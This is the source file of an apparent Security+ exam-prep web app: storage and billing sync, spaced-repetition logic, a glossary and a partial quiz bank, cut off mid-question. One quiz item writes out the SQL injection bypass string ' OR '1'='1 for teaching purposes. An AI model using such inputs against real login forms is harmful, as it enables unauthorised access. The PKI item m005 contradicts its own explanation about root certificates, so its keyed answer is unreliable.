import { useState, useEffect, useCallback, useRef } from "react";
import { capture, identifyUser, resetAnalytics } from "./lib/analytics.js";
import { getSupabaseAccessToken, isSupabaseConfigured, supabase } from "./lib/supabaseClient.js";

// ═══════════════════════════════════════════════════════════════
// PERSISTENT STORAGE
// ═══════════════════════════════════════════════════════════════
const storageGet = async (key) => {
  if (window.storage?.get) return window.storage.get(key);
  const value = window.localStorage?.getItem(key);
  return value ? { value } : null;
};
const storageSet = async (key, value) => {
  if (window.storage?.set) return window.storage.set(key, value);
  return window.localStorage?.setItem(key, value);
};
const storageDelete = async (key) => {
  if (window.storage?.delete) return window.storage.delete(key);
  return window.localStorage?.removeItem(key);
};

const DB = {
  async getUser(e) { try { const r=await storageGet(`u:${e}`); return r?JSON.parse(r.value):null; } catch { return null; }},
  async saveUser(u) { try { await storageSet(`u:${u.email}`,JSON.stringify(u)); } catch {}},
  async getSession() { try { const r=await storageGet("sess"); return r?JSON.parse(r.value):null; } catch { return null; }},
  async saveSession(d) { try { await storageSet("sess",JSON.stringify(d)); } catch {}},
  async clearSession() { try { await storageDelete("sess"); } catch {}},
  async deleteUser(e) { try { await storageDelete(`u:${e}`); await storageDelete(`att:${e}`); } catch {}},
  async getAttempts(e) { try { const r=await storageGet(`att:${e}`); return r?JSON.parse(r.value):[]; } catch { return []; }},
  async saveAttempt(e,a) { try { const p=await DB.getAttempts(e); p.unshift(a); await storageSet(`att:${e}`,JSON.stringify(p.slice(0,200))); } catch {}},
  async getDailyChallenge() { try { const r=await storageGet("daily"); return r?JSON.parse(r.value):null; } catch { return null; }},
  async saveDailyChallenge(d) { try { await storageSet("daily",JSON.stringify(d)); } catch {}},
  async getOnboardingSeen(e) { try { const r=await storageGet(`onboarded:${normalizeEmail(e)}`); return Boolean(r?.value); } catch { return false; }},
  async saveOnboardingSeen(e) { try { await storageSet(`onboarded:${normalizeEmail(e)}`,"true"); } catch {}},
  async getReferralCode(e) { try { const key=`refcode:${normalizeEmail(e)}`; let r=await storageGet(key); if(r?.value)return r.value; const code=makeReferralCode(e); await storageSet(key,code); return code; } catch { return makeReferralCode(e); }},
};

const normalizeEmail = email => (email || "").trim().toLowerCase();

function makeReferralCode(seed="secureplus") {
  const clean = normalizeEmail(seed).replace(/[^a-z0-9]/g, "").slice(0, 6) || "secure";
  return `${clean}${Math.random().toString(36).slice(2, 6)}`.toUpperCase();
}

function getStoredReferralCode() {
  try {
    const url = new URL(window.location.href);
    const ref = (url.searchParams.get("ref") || "").trim().toUpperCase();
    if (ref) {
      window.localStorage?.setItem("secureplus_referral_code", ref);
      return ref;
    }
    return window.localStorage?.getItem("secureplus_referral_code") || "";
  } catch {
    return "";
  }
}

function rememberReferralFromUrl() {
  const referralCode = getStoredReferralCode();
  if (!referralCode) return "";

  try {
    const url = new URL(window.location.href);
    if (url.searchParams.has("ref")) {
      url.searchParams.delete("ref");
      const cleanUrl = `${url.pathname}${url.search}${url.hash}`;
      window.history.replaceState({}, "", cleanUrl || "/");
    }
  } catch {}

  return referralCode;
}

async function getReferralDetails() {
  if (!isSupabaseConfigured) return null;
  const token = await getSupabaseAccessToken();
  if (!token) return null;
  const response = await fetch("/api/referrals/me", {
    method: "POST",
    headers: { authorization: `Bearer ${token}` },
  });
  const data = await response.json().catch(()=>({}));
  if (!response.ok) throw new Error(data.error || "Unable to load referral details.");
  return data;
}

function shouldShowPBQUpgradePrompt() {
  try {
    const today = new Date().toISOString().slice(0, 10);
    const key = "secureplus_pbq_prompt_date";
    if (window.localStorage?.getItem(key) === today) return false;
    window.localStorage?.setItem(key, today);
    return true;
  } catch {
    return true;
  }
}

function getPasswordIssue(password) {
  if (password.length < 8) return "Password must be at least 8 characters.";
  if (!/[A-Z]/.test(password)) return "Password must include at least one uppercase letter.";
  if (!/[a-z]/.test(password)) return "Password must include at least one lowercase letter.";
  if (!/[0-9]/.test(password)) return "Password must include at least one number.";
  if (!/[^A-Za-z0-9]/.test(password)) return "Password must include at least one special character.";
  return "";
}

function profileName(authUser) {
  const meta = authUser?.user_metadata || {};
  return meta.full_name || meta.name || authUser?.email?.split("@")[0] || "SecurePlus User";
}

function appUserFromProfile(authUser, profile) {
  const trialUntil = profile?.pro_trial_until ? new Date(profile.pro_trial_until) : null;
  const hasReferralTrial = trialUntil && trialUntil.getTime() > Date.now();

  return {
    id: authUser.id,
    email: profile?.email || authUser.email,
    name: profileName(authUser),
    tier: (profile?.tier === "pro" && ["active", "trialing"].includes(profile?.subscription_status)) || hasReferralTrial ? "pro" : "free",
    subscriptionStatus: profile?.subscription_status || null,
    proTrialUntil: profile?.pro_trial_until || null,
    referralCode: profile?.referral_code || "",
    authProvider: "supabase",
    loginMethod: authUser?.app_metadata?.provider || "email",
  };
}

async function getSupabaseProfile(authUser) {
  if (!supabase || !authUser) return null;
  const full = await supabase
    .from("profiles")
    .select("id,email,tier,subscription_status,pro_trial_until,referral_code")
    .eq("id", authUser.id)
    .maybeSingle();

  if (!full.error) return appUserFromProfile(authUser, full.data);

  const basic = await supabase
    .from("profiles")
    .select("id,email,tier,subscription_status")
    .eq("id", authUser.id)
    .maybeSingle();

  if (basic.error) console.warn("Unable to load profile", basic.error);
  return appUserFromProfile(authUser, basic.data);
}

async function claimReferralIfPresent(authUser) {
  if (!isSupabaseConfigured || !authUser?.authProvider || authUser.authProvider !== "supabase") return null;
  const referralCode = getStoredReferralCode();
  if (!referralCode) return null;
  try {
    const token = await getSupabaseAccessToken();
    if (!token) return null;
    const response = await fetch("/api/referrals/claim", {
      method: "POST",
      headers: {
        "content-type": "application/json",
        authorization: `Bearer ${token}`,
      },
      body: JSON.stringify({ referralCode }),
    });
    const data = await response.json().catch(()=>({}));
    if (response.ok) {
      capture("referral_claimed", { referral_code: referralCode });
      if (data.proTrialUntil || data.alreadyClaimed) {
        window.localStorage?.removeItem("secureplus_referral_code");
      }
      return data;
    }
    console.warn("Referral claim was not applied", data.error || response.status);
  } catch (error) {
    console.warn("Unable to claim referral", error);
  }
  return null;
}

async function syncStripeProfile(authUser, sessionId = "") {
  if (!isSupabaseConfigured || !authUser?.id) return null;
  try {
    const token = await getSupabaseAccessToken();
    if (!token) return null;
    const response = await fetch("/api/stripe/sync", {
      method: "POST",
      headers: {
        "content-type": "application/json",
        authorization: `Bearer ${token}`,
      },
      body: JSON.stringify({ sessionId }),
    });
    const data = await response.json().catch(()=>({}));
    if (!response.ok || !data.profile) return null;
    capture("billing_synced", { subscription_status: data.profile.subscription_status });
    return appUserFromProfile(authUser, data.profile);
  } catch (error) {
    console.warn("Unable to sync Stripe subscription", error);
    return null;
  }
}

function fromSupabaseAttempt(row) {
  const base = {
    qid: row.question_id,
    correct: row.correct,
    title: row.title,
    ch: row.chapter,
    domain: row.domain,
    createdAt: row.created_at,
  };
  if (row.question_type === "pbq") return { ...base, pbq: true, type: row.domain, score: row.score };
  return { ...base, mcq: true };
}

function toSupabaseAttempt(userId, attempt) {
  return {
    user_id: userId,
    question_id: attempt.qid,
    question_type: attempt.pbq ? "pbq" : "mcq",
    title: attempt.title || "",
    domain: attempt.domain || "",
    chapter: attempt.ch || null,
    correct: Boolean(attempt.correct),
    score: typeof attempt.score === "number" ? attempt.score : null,
  };
}

async function loadSupabaseAttempts(userId) {
  if (!supabase || !userId) return [];
  const { data, error } = await supabase
    .from("attempts")
    .select("question_id,question_type,title,domain,chapter,correct,score,created_at")
    .eq("user_id", userId)
    .order("created_at", { ascending: false })
    .limit(200);
  if (error) {
    console.warn("Unable to load attempts", error);
    return [];
  }
  return (data || []).map(fromSupabaseAttempt);
}

async function saveSupabaseAttempt(userId, attempt) {
  if (!supabase || !userId) return;
  const { error } = await supabase.from("attempts").insert(toSupabaseAttempt(userId, attempt));
  if (error) console.warn("Unable to save attempt", error);
}

function getAttemptDate(attempt) {
  const value = attempt.createdAt || attempt.created_at || attempt.date;
  const date = value ? new Date(value) : new Date();
  return Number.isNaN(date.getTime()) ? new Date() : date;
}

function calculateSm2State(history) {
  const sorted = [...history].sort((a,b)=>getAttemptDate(a)-getAttemptDate(b));
  let repetitions = 0;
  let interval = 0;
  let easeFactor = 2.5;
  let dueAt = new Date(0);
  let lastCorrect = null;

  sorted.forEach(attempt=>{
    const quality = attempt.correct ? 4 : 2;
    const attemptDate = getAttemptDate(attempt);

    if(quality < 3){
      repetitions = 0;
      interval = 1;
    } else {
      repetitions += 1;
      if(repetitions === 1) interval = 1;
      else if(repetitions === 2) interval = 6;
      else interval = Math.max(1, Math.round(interval * easeFactor));
    }

    const diff = 5 - quality;
    easeFactor = Math.max(1.3, easeFactor + (0.1 - diff * (0.08 + diff * 0.02)));
    dueAt = new Date(attemptDate.getTime() + interval * 24 * 60 * 60 * 1000);
    lastCorrect = attempt.correct;
  });

  return { repetitions, interval, easeFactor, dueAt, lastCorrect, attempts: sorted.length };
}

function rankQuestionsBySm2(questions, attempts) {
  const now = new Date();
  const grouped = new Map();
  attempts.filter(a=>a.mcq).forEach(attempt=>{
    if(!grouped.has(attempt.qid)) grouped.set(attempt.qid, []);
    grouped.get(attempt.qid).push(attempt);
  });

  return [...questions].sort((a,b)=>{
    const aState = calculateSm2State(grouped.get(a.id) || []);
    const bState = calculateSm2State(grouped.get(b.id) || []);
    const aNew = aState.attempts === 0;
    const bNew = bState.attempts === 0;
    const aDue = !aNew && aState.dueAt <= now;
    const bDue = !bNew && bState.dueAt <= now;
    const aWrong = aState.lastCorrect === false;
    const bWrong = bState.lastCorrect === false;

    const aScore = (aWrong?0:1000) + (aDue?0:500) + (aNew?750:0) + aState.easeFactor * 10 + aState.dueAt.getTime() / 86400000;
    const bScore = (bWrong?0:1000) + (bDue?0:500) + (bNew?750:0) + bState.easeFactor * 10 + bState.dueAt.getTime() / 86400000;
    return aScore - bScore;
  });
}

function getReviewSummary(attempts) {
  const now = new Date();
  const grouped = new Map();
  attempts.filter(a=>a.mcq).forEach(attempt=>{
    if(!grouped.has(attempt.qid)) grouped.set(attempt.qid, []);
    grouped.get(attempt.qid).push(attempt);
  });

  let due = 0;
  let weak = 0;
  grouped.forEach(history=>{
    const state = calculateSm2State(history);
    if(state.dueAt <= now) due += 1;
    if(state.lastCorrect === false) weak += 1;
  });

  return {
    due,
    weak,
    learned: grouped.size,
    untouched: Math.max(0, MCQ_BANK.length - grouped.size),
  };
}

// ═══════════════════════════════════════════════════════════════
// THEME
// ═══════════════════════════════════════════════════════════════
const THEMES = {
  dark: {
    bg:"#0b1020", surface:"#121a2b", panel:"#0f1726", border:"#263247",
    text:"#f6f8fc", textSec:"#a7b0c4", textDim:"#68738d",
    accent:"#2f7df6", accentHover:"#1d66d3", green:"#14b8a6", red:"#f43f5e", amber:"#f59e0b",
    cardBg:"#121a2b", inputBg:"#0b1220",
  },
  light: {
    bg:"#f6f8fb", surface:"#ffffff", panel:"#eef3f8", border:"#dce4ee",
    text:"#111827", textSec:"#4b5563", textDim:"#8792a6",
    accent:"#1769e0", accentHover:"#0f55bd", green:"#0f9f8f", red:"#dc274d", amber:"#c77700",
    cardBg:"#ffffff", inputBg:"#f8f9fc",
  }
};

// ═══════════════════════════════════════════════════════════════
// CHAPTER / DOMAIN STRUCTURE (Security+)
// ═══════════════════════════════════════════════════════════════
const CHAPTERS = [
  { id:"1", code:"1.0", title:"General Security Concepts", emoji:"🔐", weight:12,
    topics:["Security Controls","CIA Triad","Zero Trust","Cryptography Basics","PKI & Certificates","Authentication"] },
  { id:"2", code:"2.0", title:"Threats, Vulnerabilities & Mitigations", emoji:"⚠️", weight:22,
    topics:["Threat Actors","Social Engineering","Malware Types","Network Attacks","Application Vulnerabilities","Mitigations"] },
  { id:"3", code:"3.0", title:"Security Architecture", emoji:"🏗️", weight:18,
    topics:["Cloud Security","Network Infrastructure","Data Protection","Secure Design","Virtualization","SCADA/ICS"] },
  { id:"4", code:"4.0", title:"Security Operations", emoji:"🖥️", weight:28,
    topics:["Endpoint Hardening","Vulnerability Management","Monitoring & SIEM","Incident Response","Digital Forensics","Identity Management"] },
  { id:"5", code:"5.0", title:"Security Program Management", emoji:"📋", weight:20,
    topics:["Governance","Risk Management","Compliance & Privacy","Security Policies","Business Continuity","Third-Party Risk"] },
];

// ═══════════════════════════════════════════════════════════════
// PBQ SIM TYPES with emojis
// ═══════════════════════════════════════════════════════════════
const SIM_TYPES = {
  TERMINAL: { id:"TERMINAL SIM", label:"Terminal Sim",  emoji:"💻", color:"#6366f1" },
  DRAG:     { id:"DRAG & DROP",  label:"Drag & Drop",   emoji:"🔀", color:"#f59e0b" },
  HOTSPOT:  { id:"HOTSPOT",      label:"Hotspot",       emoji:"📍", color:"#10b981" },
  ORDERING: { id:"ORDERING",     label:"Ordering",      emoji:"📋", color:"#a78bfa" },
  FILL:     { id:"FILL BLANK",   label:"Fill in Blank", emoji:"✏️",  color:"#ec4899" },
  CONFIG:   { id:"CONFIG/ACL",   label:"Config / ACL",  emoji:"⚙️",  color:"#f59e0b" },
  LOG:      { id:"LOG ANALYSIS", label:"Log Analysis",  emoji:"📊", color:"#10b981" },
  SCENARIO: { id:"SCENARIO",     label:"Scenario",      emoji:"📖", color:"#06b6d4" },
};

const GLOSSARY_TERMS = {
  "ALE": "Annual Loss Expectancy: the expected yearly cost of a risk. Formula: SLE x ARO.",
  "SLE": "Single Loss Expectancy: the expected cost each time one incident occurs.",
  "ARO": "Annualized Rate of Occurrence: how often an incident is expected to happen per year.",
  "RTO": "Recovery Time Objective: the maximum acceptable time to restore a system after an outage.",
  "RPO": "Recovery Point Objective: the maximum acceptable data loss measured in time.",
  "PKI": "Public Key Infrastructure: certificates, keys, and authorities used to prove identity and enable encryption.",
  "CSR": "Certificate Signing Request: the file sent to a Certificate Authority to request a TLS certificate.",
  "OCSP": "Online Certificate Status Protocol: a real-time check to see whether a certificate has been revoked.",
  "CRL": "Certificate Revocation List: a published list of revoked certificates.",
  "MFA": "Multi-factor Authentication: login using two or more factor types, such as password plus authenticator app.",
  "SSO": "Single Sign-On: one login that grants access to multiple connected applications.",
  "RBAC": "Role-Based Access Control: permissions are assigned to roles, then users are placed into roles.",
  "ABAC": "Attribute-Based Access Control: access decisions use attributes such as user, device, location, and resource.",
  "DAC": "Discretionary Access Control: the resource owner can decide who gets access.",
  "MAC": "Mandatory Access Control: the system enforces access based on labels and clearances.",
  "SIEM": "Security Information and Event Management: a platform that collects and correlates security logs.",
  "EDR": "Endpoint Detection and Response: tooling that monitors endpoints and helps investigate suspicious activity.",
  "XDR": "Extended Detection and Response: detection and response across endpoints, network, identity, cloud, and more.",
  "DLP": "Data Loss Prevention: controls that detect or stop sensitive data from leaving approved locations.",
  "CASB": "Cloud Access Security Broker: security enforcement between users and cloud services.",
  "SASE": "Secure Access Service Edge: cloud-delivered networking and security, often combining SD-WAN and SSE.",
  "CVSS": "Common Vulnerability Scoring System: a standard severity score for vulnerabilities.",
  "BIA": "Business Impact Analysis: identifies critical processes and the impact of disruption.",
  "MTTD": "Mean Time To Detect: average time needed to discover an incident.",
  "MTTR": "Mean Time To Respond or Recover: average time needed to contain or restore after an incident.",
  "WAF": "Web Application Firewall: a control that filters malicious web requests before they reach an app.",
  "IDS": "Intrusion Detection System: detects suspicious activity and alerts.",
  "IPS": "Intrusion Prevention System: detects suspicious activity and can block it.",
  "HSM": "Hardware Security Module: tamper-resistant hardware for protecting cryptographic keys.",
  "KMS": "Key Management Service: a system for creating, storing, rotating, and controlling encryption keys.",
  "DDoS": "Distributed Denial of Service: many systems flood a target to make it unavailable.",
  "SQL injection": "A vulnerability where attacker-controlled input changes a SQL query.",
  "Zero Trust": "A security model that continuously verifies users, devices, and access instead of trusting by location.",
  "Tokenization": "Replacing sensitive data with a non-sensitive token while storing the real value separately.",
  "Hashing": "A one-way transformation used to verify integrity or store passwords safely when done with salts and slow algorithms.",
  "Encryption": "A reversible protection method that converts readable data into ciphertext using a key.",
};

// ═══════════════════════════════════════════════════════════════
// MCQ BANK — original, accurate, Security+ aligned, not copyrighted
// Easy, medium, and hard mix across all 5 domains
// ═══════════════════════════════════════════════════════════════
const MCQ_BANK = [
  // ── CHAPTER 1: General Security Concepts ────────────────────
  { id:"m001", ch:"1", difficulty:"easy", topic:"Security Controls",
    q:"A motion-sensor flood light activates whenever someone enters the car park after dark. Which control type BEST describes this?",
    opts:["Preventive","Detective","Deterrent","Corrective"], correct:2,
    exp:"A deterrent discourages bad actors before an incident occurs. The light doesn't prevent or detect intrusion — it discourages it. If it recorded footage it would also be detective, but the primary function described is deterrence.",
    wrongFeedback:{ 0:"Preventive controls block the action — a locked gate would be preventive, not a light that simply comes on.", 1:"Detective controls identify incidents after they occur, like reviewing camera footage. This light turns on proactively.", 3:"Corrective controls restore systems after an incident, e.g. restoring backups. No incident occurs here." }},

  { id:"m002", ch:"1", difficulty:"easy", topic:"CIA Triad",
    q:"An attacker floods a web server with traffic until it stops responding to legitimate users. Which CIA Triad property is PRIMARILY affected?",
    opts:["Confidentiality","Integrity","Availability","Non-repudiation"], correct:2,
    exp:"Availability means systems are accessible to authorised users when needed. A flood attack (DoS/DDoS) specifically targets availability by exhausting server resources.",
    wrongFeedback:{ 0:"Confidentiality relates to unauthorised disclosure of data. No data is exposed here.", 1:"Integrity concerns unauthorised modification of data. The data is untouched in this attack.", 3:"Non-repudiation ensures actions cannot be denied. It is unrelated to resource exhaustion attacks." }},

  { id:"m003", ch:"1", difficulty:"medium", topic:"Security Controls",
    q:"An organisation cannot deploy MFA on its legacy HR system. Instead, it enforces strict password length requirements and logs every login attempt. What control type is this?",
    opts:["Directive","Corrective","Compensating","Preventive"], correct:2,
    exp:"A compensating control is an alternative used when the preferred control (MFA) cannot be implemented. It addresses the same risk through a different mechanism.",
    wrongFeedback:{ 0:"Directive controls provide instructions or guidance (policies, signs). This is an active technical control, not guidance.", 1:"Corrective controls respond after an incident — nothing has happened yet here.", 3:"Preventive controls block incidents. The password policy helps but the key concept is that it substitutes for an unavailable control." }},

  { id:"m004", ch:"1", difficulty:"medium", topic:"Cryptography Basics",
    q:"A password storage system adds a unique random string to each password before hashing it. Which attack does this PRIMARILY protect against?",
    opts:["Brute-force attack","Rainbow table attack","Man-in-the-middle attack","Replay attack"], correct:1,
    exp:"Salting ensures that identical passwords produce different hash values. Rainbow tables rely on precomputed hashes for common passwords — unique salts make those precomputed tables useless.",
    wrongFeedback:{ 0:"Brute-force attacks are slowed by key-stretching algorithms like bcrypt or Argon2, not by salting alone.", 2:"Man-in-the-middle attacks intercept network communications — salting is a storage mechanism unrelated to network traffic.", 3:"Replay attacks reuse captured authentication tokens. Salting passwords does not address session or token reuse." }},

  { id:"m005", ch:"1", difficulty:"hard", topic:"PKI & Certificates",
    q:"A website certificate is signed by an intermediate CA, which is signed by a root CA. The root CA certificate is NOT included in the server's certificate chain. What is the MOST likely result?",
    opts:["Connection succeeds — root CAs are always trusted by default","Browsers display a certificate error because the chain cannot be completed","The intermediate certificate is rejected","The connection falls back to HTTP automatically"], correct:1,
    exp:"Browsers trust root CAs that are pre-installed in the OS/browser trust store. If the server omits intermediate certificates, the browser cannot build the chain to a trusted root and will display an error. Root CA certs must be in the trust store — they are not transmitted by the server.",
    wrongFeedback:{ 0:"Root CAs are in the trust store, but the browser must be able to BUILD the chain. A missing intermediate breaks the chain even if the root is trusted.", 2:"The intermediate itself is valid — the issue is the server failing to send it so the browser can complete the chain.", 3:"Browsers do not fall back to HTTP automatically on certificate errors; they block the connection and warn the user." }},

  { id:"m006", ch:"1", difficulty:"easy", topic:"Authentication",
    q:"Which of the following is an example of 'something you are' as an authentication factor?",
    opts:["A smart card","A PIN","A fingerprint scan","A one-time passcode"], correct:2,
    exp:"'Something you are' refers to biometric factors that are intrinsic to your physical body — fingerprints, facial recognition, iris scans, and voice patterns.",
    wrongFeedback:{ 0:"A smart card is 'something you have' — a physical token you possess.", 1:"A PIN is 'something you know' — memorised information.", 3:"A one-time passcode is 'something you have' (it is generated by a device or sent to your phone)." }},

  { id:"m007", ch:"1", difficulty:"medium", topic:"Zero Trust",
    q:"Which Zero Trust principle BEST explains why an internal user's traffic should be inspected even though they are already on the corporate network?",
    opts:["Implicit trust within the perimeter","Never trust, always verify","Default-allow policy for authenticated users","Separation of duties"], correct:1,
    exp:"Zero Trust eliminates implicit trust based on network location. 'Never trust, always verify' means that even authenticated internal users must be continuously validated — because insider threats and lateral movement are real.",
    wrongFeedback:{ 0:"Implicit perimeter trust is the OLD model that Zero Trust replaces. Assuming internal traffic is safe was responsible for many breach escalations.", 2:"Zero Trust explicitly rejects default-allow policies. All access should be explicitly authorised.", 3:"Separation of duties is a governance concept about dividing critical tasks. It is unrelated to continuous verification." }},

  { id:"m008", ch:"1", difficulty:"hard", topic:"Cryptography Basics",
    q:"An organisation needs to encrypt data in a way that allows only the recipient to decrypt it, without the sender and recipient ever having met to share a secret. Which approach BEST satisfies this?",
    opts:["Symmetric encryption with AES-256","Asymmetric encryption using the recipient's public key","A shared Diffie-Hellman session key","Hashing with SHA-256"], correct:1,
    exp:"Asymmetric encryption allows anyone to encrypt using a recipient's publicly available key, while only the recipient's corresponding private key can decrypt it. No prior key exchange meeting is needed.",
    wrongFeedback:{ 0:"Symmetric encryption requires both parties to share the same secret key in advance — the key distribution problem.", 2:"Diffie-Hellman establishes a shared secret, but the parties must complete a key exchange protocol together first.", 3:"SHA-256 is a one-way hash function — it does not encrypt or decrypt data." }},

  // ── CHAPTER 2: Threats, Vulnerabilities & Mitigations ───────
  { id:"m009", ch:"2", difficulty:"easy", topic:"Social Engineering",
    q:"An attacker calls the help desk, pretending to be the CFO and urgently requesting a password reset. Which social engineering technique is this?",
    opts:["Phishing","Vishing with pretexting","Smishing","Watering hole"], correct:1,
    exp:"Vishing is voice-based phishing. Pretexting is the fabricated scenario (pretending to be the CFO). Both elements combine here — the attacker uses a fake identity over a phone call to manipulate the target.",
    wrongFeedback:{ 0:"Phishing is delivered via email. This attack uses a phone call, making it vishing.", 2:"Smishing is SMS-based. This attack uses a voice call.", 3:"A watering hole attack compromises a website to infect targeted visitors — unrelated to a phone call." }},

  { id:"m010", ch:"2", difficulty:"easy", topic:"Malware Types",
    q:"Malware installs itself on a system and records every keystroke the user makes, including passwords and credit card numbers. What type of malware is this?",
    opts:["Ransomware","Rootkit","Keylogger","Worm"], correct:2,
    exp:"A keylogger records keystrokes to harvest credentials and sensitive information. It operates silently in the background without modifying or encrypting files.",
    wrongFeedback:{ 0:"Ransomware encrypts files and demands payment for the decryption key.", 1:"A rootkit hides malware at the OS or kernel level to evade detection — it doesn't primarily capture keystrokes.", 3:"A worm self-replicates across networks — it does not primarily focus on capturing keystrokes." }},

  { id:"m011", ch:"2", difficulty:"medium", topic:"Network Attacks",
    q:"An attacker sends SYN packets to a server from thousands of spoofed IP addresses but never completes the handshakes. What is the BEST mitigation?",
    opts:["Increase the server's connection timeout","Enable SYN cookies on the server","Block all inbound TCP traffic","Deploy an IDS sensor"], correct:1,
    exp:"SYN cookies allow the server to handle SYN packets without allocating memory for half-open connections. The server encodes connection state in the SYN-ACK, only allocating resources when the final ACK is received.",
    wrongFeedback:{ 0:"Increasing timeout makes the problem worse — half-open connections linger even longer, consuming more resources.", 2:"Blocking all TCP traffic would stop the attack but also stop all legitimate services — it is not a viable mitigation.", 3:"An IDS detects and alerts on the attack but does not prevent or stop it. An IPS that rate-limits would help, but SYN cookies address the root cause." }},

  { id:"m012", ch:"2", difficulty:"medium", topic:"Application Vulnerabilities",
    q:"A login form passes the username directly into a database query without sanitisation. An attacker enters: ' OR '1'='1. They successfully log in without a valid password. What vulnerability is exploited?",
    opts:["Cross-site scripting (XSS)","SQL injection","Buffer overflow","Directory traversal"], correct:1,
    exp:"SQL injection occurs when user-supplied input is concatenated directly into SQL queries. The payload modifies the query logic so the WHERE clause always evaluates to true. Fix: use parameterised queries (prepared statements).",
    wrongFeedback:{ 0:"XSS injects JavaScript into web pages to execute in other users' browsers — it targets the client, not the database.", 2:"Buffer overflow writes past allocated memory boundaries — it is a memory management vulnerability, not a query vulnerability.", 3:"Directory traversal uses '../' sequences to access files outside the intended directory — unrelated to database queries." }},

  { id:"m013", ch:"2", difficulty:"hard", topic:"Threat Actors",
    q:"A threat actor group has nation-state funding, uses previously unknown zero-day exploits, and maintains persistent access to a target for 18 months without detection. Which category BEST describes this actor?",
    opts:["Script kiddie","Hacktivist","Advanced Persistent Threat (APT)","Insider threat"], correct:2,
    exp:"APTs are characterised by: nation-state or equivalent funding, use of sophisticated custom tools and zero-days, and long-dwell-time operations designed to avoid detection. The 18-month persistence is a hallmark APT indicator.",
    wrongFeedback:{ 0:"Script kiddies use off-the-shelf tools without deep technical knowledge and typically lack the resources for zero-days or sustained campaigns.", 1:"Hacktivists are ideologically motivated and typically use noisier, shorter campaigns (defacement, DDoS) — not prolonged stealth operations.", 3:"Insider threats have legitimate access but the description points to an external actor with nation-state resources." }},

  { id:"m014", ch:"2", difficulty:"easy", topic:"Mitigations",
    q:"Which principle ensures that a user account can only access the files and systems needed to perform their job, and nothing more?",
    opts:["Separation of duties","Least privilege","Job rotation","Mandatory access control"], correct:1,
    exp:"Least privilege restricts users to the minimum access required for their role. This limits the blast radius of compromised accounts and reduces insider threat risk.",
    wrongFeedback:{ 0:"Separation of duties requires multiple people to complete a sensitive process — it divides tasks, it doesn't restrict permission scope.", 2:"Job rotation moves employees between roles over time to detect fraud — it does not define the scope of permissions.", 3:"Mandatory access control (MAC) is a system that enforces labels, but the principle of minimum necessary access is 'least privilege'." }},

  { id:"m015", ch:"2", difficulty:"hard", topic:"Social Engineering",
    q:"An attacker registers the domain 'cornpany.com' (using 'rn' instead of 'm') and hosts a convincing copy of the corporate intranet login page. Which technique is this?",
    opts:["Watering hole attack","Business email compromise","Typosquatting","Vishing"], correct:2,
    exp:"Typosquatting (URL hijacking) registers domain names that are common misspellings of legitimate sites. Users who mistype the URL land on the attacker's convincing fake page and submit credentials.",
    wrongFeedback:{ 0:"A watering hole attack compromises a legitimate website that the target is known to visit — not a fake lookalike domain.", 1:"Business email compromise targets executives to authorise fraudulent financial transfers — unrelated to a fake website.", 3:"Vishing is a voice-based attack. This attack operates entirely through a deceptive website." }},

  { id:"m016", ch:"2", difficulty:"medium", topic:"Malware Types",
    q:"After a disgruntled employee is terminated, their payroll access is revoked. Three months later, payroll records are deleted. Investigation reveals code the employee secretly inserted before leaving that was set to trigger on a specific date. What type of malware is this?",
    opts:["Trojan","Logic bomb","Ransomware","Rootkit"], correct:1,
    exp:"A logic bomb is malicious code that remains dormant until a specific condition is met (a date, a login event, the deletion of a user account). It is a common insider threat tool — planted before departure to cause damage after the fact.",
    wrongFeedback:{ 0:"A Trojan disguises itself as legitimate software to trick users into installing it — it doesn't rely on a trigger condition.", 2:"Ransomware encrypts files and demands payment. The payroll records here are deleted, not encrypted for ransom.", 3:"A rootkit hides malware at a deep OS level — it is a concealment mechanism, not a timed destruction tool." }},

  // ── CHAPTER 3: Security Architecture ────────────────────────
  { id:"m017", ch:"3", difficulty:"easy", topic:"Cloud Security",
    q:"In the cloud shared responsibility model for Infrastructure as a Service (IaaS), which item is the CUSTOMER'S responsibility?",
    opts:["Physical data centre security","Hypervisor patching","Guest OS patching and configuration","Network hardware maintenance"], correct:2,
    exp:"In IaaS, the cloud provider manages physical infrastructure, networking hardware, and the hypervisor. The customer is responsible for everything above the hypervisor: the guest operating system, applications, and data.",
    wrongFeedback:{ 0:"Physical security of data centres is always the cloud provider's responsibility in all service models.", 1:"The hypervisor is part of the provider's managed infrastructure in IaaS.", 3:"Network hardware (switches, routers in the data centre) is owned and maintained by the provider." }},

  { id:"m018", ch:"3", difficulty:"medium", topic:"Network Infrastructure",
    q:"A security device is placed inline between two network segments. When the device fails due to a hardware fault, ALL traffic is blocked. Which failure mode is this and in what environment is it MOST appropriate?",
    opts:["Fail-open — most appropriate for hospitals where downtime is critical","Fail-closed — most appropriate for environments where security outweighs availability","Fail-open — most appropriate for classified government networks","Fail-closed — most appropriate for public e-commerce sites"], correct:1,
    exp:"Fail-closed (fail-secure) blocks all traffic when a security device fails, prioritising security over availability. It is appropriate for classified networks, financial trading systems, or any environment where a brief outage is preferable to allowing uninspected traffic.",
    wrongFeedback:{ 0:"Fail-open allows traffic when the device fails — this is appropriate for hospitals (high availability need), not fail-closed.", 2:"Fail-open is the opposite — it lets traffic through on failure. Classified networks would use fail-closed.", 3:"Public e-commerce sites typically prefer fail-open to maintain revenue — downtime costs money. Security-critical environments use fail-closed." }},

  { id:"m019", ch:"3", difficulty:"medium", topic:"Data Protection",
    q:"A payment processor replaces stored credit card numbers with random surrogate values. The original numbers are stored separately in a secure vault. What technique is this?",
    opts:["Encryption","Hashing","Tokenisation","Data masking"], correct:2,
    exp:"Tokenisation substitutes sensitive data with a surrogate value (token). The original data is stored in a separate, highly secured token vault. Unlike encryption, tokens have no mathematical relationship to the original data.",
    wrongFeedback:{ 0:"Encryption transforms data using an algorithm and key — the ciphertext still has a mathematical relationship to the plaintext. Encryption is reversible with the key.", 1:"Hashing is a one-way function that cannot be reversed. It is used for integrity verification, not for substituting stored values that need to be retrieved.", 3:"Data masking replaces data with realistic-looking fake data (used in non-production environments). The original data is not stored in a vault for later retrieval." }},

  { id:"m020", ch:"3", difficulty:"hard", topic:"Secure Design",
    q:"A SCADA system controlling water treatment cannot be taken offline for patching because the vendor no longer supports the software. What is the MOST appropriate security control?",
    opts:["Accept the risk with no additional controls","Immediately replace the entire system","Implement network segmentation and compensating controls","Install third-party antivirus on the SCADA system"], correct:2,
    exp:"When patching is impossible, the best practice is to isolate the system (air-gap or VLAN segmentation), apply compensating controls (strict firewall rules, one-way data diodes, enhanced monitoring), and document the accepted residual risk. Replacement is ideal but often requires years of planning in OT environments.",
